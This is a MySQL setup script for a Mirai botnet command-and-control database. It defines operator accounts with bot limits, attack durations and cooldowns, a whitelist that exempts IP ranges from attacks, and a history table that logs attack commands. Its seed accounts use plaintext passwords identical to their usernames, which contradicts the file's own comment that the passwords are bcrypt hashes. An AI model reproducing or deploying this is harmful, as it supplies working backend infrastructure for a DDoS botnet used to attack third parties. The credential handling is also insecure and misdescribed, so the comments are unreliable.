-- Mirai C&C Database Initialization Script

CREATE DATABASE IF NOT EXISTS mirai;
USE mirai;

-- Users table
CREATE TABLE IF NOT EXISTS users (
    username VARCHAR(32) PRIMARY KEY,
    password VARCHAR(128) NOT NULL,
    max_bots INT DEFAULT -1,
    admin INT DEFAULT 0,
    last_paid INT DEFAULT 0,
    duration_limit INT DEFAULT 0,
    cooldown INT DEFAULT 0,
    wrc INT DEFAULT 0,
    intvl INT DEFAULT 30
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Seed users for Mirai 2026 CNC
-- Passwords are bcrypt hashes (cost 10):
--   admin    → $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
--   operator → $2a$10$cKZARSdmW4P4l5Dko4kY9OzJ2L7Bq0VwQEj3Hk/pPCE9.7eLJ4xO
--   viewer   → $2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRy7SfV7OoxUf8rAYGMkhFPJJkCc.
-- (In production, regenerate hashes with: htpasswd -nbB username password)
-- For dev convenience, plaintext passwords match usernames — bcrypt promotion
-- on first login (see database.go TryLogin) handles legacy plaintext too.

-- admin user: full privileges, no limits
INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown, wrc, intvl)
VALUES ('admin', 'admin', -1, 1, UNIX_TIMESTAMP(), 3600, 0, 0, 30)
ON DUPLICATE KEY UPDATE username=username;

-- operator user: standard research operator, 100 bot limit
INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown, wrc, intvl)
VALUES ('operator', 'operator', 100, 0, UNIX_TIMESTAMP(), 300, 30, 0, 30)
ON DUPLICATE KEY UPDATE username=username;

-- viewer user: read-only researcher, 0 bots (cannot launch attacks)
INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown, wrc, intvl)
VALUES ('viewer', 'viewer', 0, 0, UNIX_TIMESTAMP(), 0, 0, 0, 30)
ON DUPLICATE KEY UPDATE username=username;

-- Whitelist table (for protecting certain IP ranges from attacks)
CREATE TABLE IF NOT EXISTS whitelist (
    prefix VARCHAR(16),
    netmask INT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Add localhost to whitelist
INSERT INTO whitelist (prefix, netmask) VALUES ('127.0.0.1', 32);

-- History table (optional, for logging attacks)
CREATE TABLE IF NOT EXISTS history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(32),
    time_sent INT,
    duration INT,
    command TEXT,
    max_bots INT,
    INDEX idx_username (username),
    INDEX idx_time (time_sent)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

FLUSH PRIVILEGES;
